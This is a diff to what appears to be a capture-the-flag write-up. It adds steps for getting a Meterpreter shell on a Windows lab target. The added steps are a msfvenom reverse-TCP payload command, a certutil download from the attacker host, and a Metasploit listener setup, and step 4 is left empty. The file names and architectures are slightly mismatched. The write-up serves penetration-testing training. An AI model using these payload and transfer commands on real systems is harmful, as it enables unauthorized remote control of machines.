@@ -63,6 +63,32 @@ cat c:\users\administrator\desktop\flag.txt
 
 We will have to elevate our privileges and get a proper shell on the target, lets do so using Meterpreter 
 
+## 1. Create a PAYLOAD using MSFVenom
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.117 LPORT=7777 -f exe -o reverse.exe
+```
+## 2. Transfer the Payload to the target (certutil)
+
+```bash
+certutil.exe -urlcache -f http://10.10.14.117:8080/reverse.aspx reverse.aspx
+```
+## 3. Setup Listener 
+
+```bash
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 10.10.14.117
+LHOST => 10.10.14.117
+msf6 exploit(multi/handler) > set LPORT 7777
+LPORT => 7777
+msf6 exploit(multi/handler) > run
+
+```
+## 4. Execute the Payload on the Target
+
 
 
 For this we will have to Kerberoast the accounts, lets try and use either PowerView or Rubeus 
